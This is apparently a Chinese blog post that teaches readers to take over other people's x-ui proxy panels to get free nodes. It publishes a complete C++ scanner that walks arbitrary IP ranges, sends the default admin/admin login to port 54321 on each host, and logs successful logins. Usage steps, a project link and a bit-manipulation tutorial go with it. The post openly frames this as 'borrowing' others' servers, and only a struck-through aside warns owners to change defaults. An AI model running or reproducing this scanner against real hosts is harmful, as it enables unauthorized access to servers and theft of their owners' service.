# 一期教会你白嫖免费节点！

众所周知呢 `x-ui` 是一个简单易用的程序

能够帮大家非常轻易的**搭建节点**，并且非常容易管理

对于广大`Mjj`搭建节点非常的友好

提供了非常好的可视化管理界面



但是在方便的同时呢，又遗留下了很多的安全问题

就比如说 **登陆** 的时候

细心的朋友们就会发现了

他用的居然是**明文处理**！

没有任何**加密**！这就和**裸奔**没什么区别

但是可能是出于简单易用的目的 也方便大家对接自己的项目什么的

才做的明文

但是不管怎么样 **安全问题**确实是存在的

具体请看图

![Screenshot 2024-09-07 at 10.13.12 AM.png](https://image.derrity-geek.org/i/2024/09/07/66dbb6beeaed6.png)



这就意味着什么呢

我们可以手动写数据包发送到他的`api`

> http://<ip>:<port>/login



提示 `true` 就直接登陆成功了

那……我们是不是也可以给别人的服务器发送这些请求呢

那……是不是就顺理成章的 ~~**借到了**~~ 别人的节点呢



如果我们只是知道一个 `ip地址` 那我们可以慢慢的爆破密码处理

但是我们完全不知道别人的`服务器ip`怎么办？

一个一个去判断 `端口` 开没开 有没有开启 `服务`

这实在是太麻烦了。



而且我们知道

`x-ui` 的默认账号密码是 `admin` `admin`

默认的 `port`是`54321`

有些人觉得麻烦 就直接不更改端口和密码 认为不会扫到自己的服务器

这无疑给自己留下了非常大的安全隐患

~~**请妥善保管好自己的账号密码 修改默认端口 避免这样的情况 数据无价**~~



那我们是不是就可以 生成好多好多 `IP`

账号密码都用 `admin`

然后给这些`IP`一个个的发送请求 如果返回 `true` 就记录下来呢

那 **(>^ω^<)** 



那我们说干就干！

不过在开始之前 我们需要明白一件事情

那就是 如何非常迅速的来完成这个任务呢



聪明的小伙伴很快就想到了 **多线程**

的确 这是一个非常好的选择 

但是我们同时也需要考虑到`多线程`带来的**硬件开销**

如果只是发送几千个请求，那么多线程，确实是一个提高速度的很好的方法

那如果我们面对的是像`1.1.1.1` to `255.255.255.255`这样的庞大数字呢

这时候我们如果使用 `多线程并发` 那么如果某个线程因为网络延迟等原因阻塞了，可能会影响其他线程的工作

这是很常见的阻塞错误

而这时候我们就需要用到 一项技术 **异步**

异步的有点就在于不需要**等待** 执行完了就下一步

然后慢慢得到**response**



![7g4kckddvp.jpeg](https://image.derrity-geek.org/i/2024/09/07/66dbff6487b71.jpeg)



相信这幅图能够很直观的展现出来

这无疑对我们的 **<发送大量请求>** 的任务有了大大的帮助



那么

理论存在 实践开始！



首先第一步就是生成我们所需`需要范围IP地址`，然后把它们存储到`数组(array)`或者是`向量(vector)`当中去

再把它们一个个提取出来发送请求



让我们来输入范围吧！

```bash
./damn 1.1.1.1 2.2.2.2 
```

```cpp
    std::string start_ip = argv[1];
    std::string end_ip = argv[2];
```

毫无疑问这是在获取 初始和末尾ip

而我们肯定是希望得到的ip数列是这样的

> 1.1.1.1
>
> 1.1.1.2
>
> 1.1.1.3
>
> ............
>
> 2.2.2.1
>
> 2.2.2.2

这看起来比较麻烦

但是实际上确实有点麻烦

我们需要先将 ip 转化为一长串数字

然后一直 + 1 嘿嘿**凸^-^凸**没想到吧

但是这时候你就会想到了

那转化到 `256` `257` `999` 超出范围了怎么办

别急 等下会解释

```cpp
unsigned long ip_to_number(const std::string& ip) {
    unsigned long result = 0;
    std::istringstream iss(ip);
    std::string segment;
    int segment_int;

    int expected_segments = 4;
    while (std::getline(iss, segment, '.')) {
        try {
            segment_int = std::stoi(segment);
            if (segment_int < 0 || segment_int > 255) {
                throw std::invalid_argument("区间范围只能在0-255内");
            }
            result = (result << 8) + segment_int;
            --expected_segments;
        } catch (const std::invalid_argument& e) {
            std::cerr << "输入的IP段有误: " << e.what() << std::endl;
            return 0;
        } catch (const std::out_of_range& e) {
            std::cerr << "数值超出了整数范围: " << e.what() << std::endl;
            return 0;
        }
    }

    if (expected_segments != 0) {
        std::cerr << "输入的IP地址格式不正确！" << std::endl;
        return 0;
    }

    return result;
}
```

在这里面 我还加了一点判断和处理

那么最核心的部分当然就是 

```cpp
result = (result << 8) + segment_int;
--expected_segments;
```

我们将ip地址以`.`为分割 分开读取

添加到上一块的屁股后面

`<< 8` 当然就是 `*256` 的意思啦

这就要说到`二进制`了



众所周知 计算机的底层是用`二进制`来运算的

如果要**更快的**对数字进行处理

那么最好的办法就是直接对`二进制`进行`位操作`

而我们知道 计算机是无法直接进行`乘除法运算`的 只会做`加减法`

乘法也只是一只`++++----`而已

所以这时候使用 `位操作` 就显得格外重要了

那什么是 `位操作` 呢

直接对二进制进行移位呗 还能干嘛

我们大家都知道，二进制就是以2位进制单位的

那么就意味着什么呢 `10` 代表的是 `2`  `11`是`3` `111000`是`56`

什么 这你还看不懂？

那我们就更加详细一点

> 1     -> 1   -> 2^0
>
> 10   -> 2   -> 2^1  
>
> 100 -> 4   -> 2^2

发现了吗

多少个 0 就是 2 的多少次方 

那如果是刚才说的 `111000` 是怎么计算的呢
```yaml
      100000      (2^5 = 32)
       10000      (2^4 = 16)
+       1000      (2^3 = 8)
--------------------------------
      111000      (32 + 8 + 16 = 40 + 16 =56)
```
懂了吧

那我们要让数字 `* 256` 该怎么办 ~~（靠北 为什么是*256 哦～原来范围是0-255）~~

聪明的你 肯定想到了 在数字某位添加 `8 个 0` 不就行了

是的！没有错！这也可以等效于 把原来的数字往左 `移 8 位` 空缺的地方用 `0` 补位

这就是 `result << 8` 的意义

那么再 `+ segment_int` 是什么意义就不用我多说了 添加到末尾上来

```yaml
   0000 0101   (5)
+  0000 1001   (9)
--------------------
   0000 1110   (14)

```

那么同理 `>> 8 ` 就是 `/ 256`



但是这只是简单的处理一行数字啊

完全没有必要浪费自己的脑子去想二进制

~~好吧确实~~ 我这样做是为了和下面的代码保持统一格式



既然有了把 `ip` 转换成 `数字`的步骤

那肯定就要有 `数字` 到 `ip` 的步骤

```cpp
std::string number_to_ip(unsigned long number) {
    std::ostringstream oss;
    for (int i = 3; i >= 0; --i) {  
        oss << ((number >> (i * 8)) & 0xFF);
        if (i > 0)
            oss << ".";
    }
    return oss.str();
}

```

诶嘿嘿 我就不讲

你先自己猜猜看是什么意思

引入眼帘的， 我用了一段循环

从 `3` 到 `0` 进行循环，每次处理IPv4地址的一个段。IPv4地址由四个段组成，每个段占8位，因此从高位到低位处理这四个段

**`number >> (i * 8)`** 通过右移操作，将IP地址的当前段移到最低有效位

那么有限小朋友就要头痛了这是怎么个回事呢

差不多就是这样

- 对于 `i = 3`（最高位），右移 `24` 位，将其移到最低有效位置
- 对于 `i = 2`，右移 `16` 位
- 对于 `i = 1`，右移 `8` 位
- 对于 `i = 0`，不需要右移，已经在最低位

而最重要的是 `& 0xFF` 这一串

众所周知 `0xFF` 代表的是 十进制数字 `255` 哦～瞬间知道是干什么用的了吧

通过按位与操作与 `0xFF` 进行位操作，提取当前段的值

那么`&`是什么意思呢 是 and 吗 是个DAMN 当然不是

```yam
  00001100  (12)
& 00000111  (7)
  --------
  00000100  (4)
```

是不是有点糊涂

但是不难发现 `有 1 取 0` `有 0 取 0` `2 1而行`

只有当两个数字都是1 的时候 才会写入 1

不然都是0

这样 是不是就很轻而易举的提取出来末尾项了呢



然后就是根据范围生成 ip 了 这里就不多说了

还有发送请求什么的 干脆一整个那过来自己看一下

接下来没什么好讲的了

```cpp
#include <iostream>
#include <curl/curl.h>
#include <sstream>
#include <string>
#include <future>
#include <fstream>
#include <vector>
#include <cstdio>
#include "nlohmann/json.hpp"

using json = nlohmann::json;

std::mutex file_mutex;

unsigned long success = 0;

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

unsigned long ip_to_number(const std::string& ip) {
    unsigned long result = 0;
    std::istringstream iss(ip);
    std::string segment;
    int segment_int;

    int expected_segments = 4;
    while (std::getline(iss, segment, '.')) {
        try {
            segment_int = std::stoi(segment);
            if (segment_int < 0 || segment_int > 255) {
                throw std::invalid_argument("区间范围只能在0-255内");
            }
            result = (result << 8) + segment_int;
            --expected_segments;
        } catch (const std::invalid_argument& e) {
            std::cerr << "输入的IP段有误: " << e.what() << std::endl;
            return 0;
        } catch (const std::out_of_range& e) {
            std::cerr << "数值超出了整数范围: " << e.what() << std::endl;
            return 0;
        }
    }

    if (expected_segments != 0) {
        std::cerr << "输入的IP地址格式不正确！" << std::endl;
        return 0;
    }

    return result;
}

std::string number_to_ip(unsigned long number) {
    std::ostringstream oss;
    for (int i = 3; i >= 0; --i) {  
        oss << ((number >> (i * 8)) & 0xFF);
        if (i > 0)
            oss << ".";
    }
    return oss.str();
}
std::vector<std::string> generate_ips(const std::string& start_ip, const std::string& end_ip){
    std::vector<std::string> result;
    unsigned long start = ip_to_number(start_ip);
    unsigned long end = ip_to_number(end_ip);

    if (start == 0 || end == 0) {
        std::cerr << "无效的IP地址" << std::endl;
        return {};
    }

    if (start > end) {
        std::cerr << "起始IP必须小于等于结束IP" << std::endl;
        return {};
    }

    for (unsigned long ip = start; ip <= end; ip++) {
        result.push_back(number_to_ip(ip));
    }

    return result;
}

void sendRequest(const std::string& ip, std::ofstream& file){
    const std::string url = "http://" + ip + ":54321/login";
    
    CURL *curl;
    CURLcode res;
    std::string response;

    curl = curl_easy_init();

    if (curl) {
        const std::string postfield = "username=admin&password=admin";

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfield.c_str());

        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 1L);
		curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);


        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        std::cout << "正在尝试 " << ip << "\n";

        if(res == CURLE_OK) {
            try {
                json j = json::parse(response);
                if (j["success"].get<bool>()) {
                	std::lock_guard<std::mutex> lock(file_mutex);
                    file << ip << "\n";
                    ++success;
                    std::cout << ip << " 成功" << std::endl;
                }
            } catch (json::parse_error &e) {
                std::cerr << "JSON 解析错误: " << e.what() << std::endl;
            }
        } 

        curl_easy_cleanup(curl);
    } else {
        std::cerr << "curl初始化失败" << std::endl;
    }

}

int main(int argc, char *argv[]){
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <start_ip> <end_ip> <concurrent_number>" << std::endl;
        return 1;
    }

    curl_global_init(CURL_GLOBAL_DEFAULT);

    std::string start_ip = argv[1];
    std::string end_ip = argv[2];

    std::vector<std::string> ips = generate_ips(start_ip, end_ip);

    std::ofstream output("success.txt", std::ios::app);

    const int max_concurrent_requests = std::stoi(argv[3]);
	std::vector<std::future<void>> futures;

	for (size_t i = 0; i < ips.size(); ++i) {
    if (futures.size() >= max_concurrent_requests) {
        for (auto &f : futures) {
            f.get();
        }
        futures.clear(); 
    }
    futures.push_back(std::async(std::launch::async, sendRequest, ips[i], std::ref(output)));
	}

	for (auto &f : futures) {
    	f.get();
	}


    output.close();

    std::cout << "总共成功 " << success << " 次" << std::endl;

    curl_global_cleanup();

    return 0;
}
```



使用方法呢 就是

```bash
./<name> 1.1.1.1 2.2.2.2 <count>
```

这个 `count` 不是线程数

是一次异步的`进程`数量 

然后释放

不然vector的元素太多 电脑容易暴毙而亡

然后 成功的 会写在当前目录文件`success.txt`里面去

那就让我们来实操一下

~~忘记说了 你需要先安装 `libcurl4-openssl-dev` 编译的时候记得链接到 `libcurl` `pthread`~~

![Screenshot 2024-09-07 at 4.41.46 PM.png](https://image.derrity-geek.org/i/2024/09/07/66dc11d4bb5b3.png)

![Screenshot 2024-09-07 at 4.42.33 PM.png](https://image.derrity-geek.org/i/2024/09/07/66dc120222056.png)



还不错

这是我们的项目地址

https://github.com/Derrity/x-ui-cracker

如果觉得程序有哪里不对劲的 或者有任何疑问的 请 提issue

每一个我都会认真看的
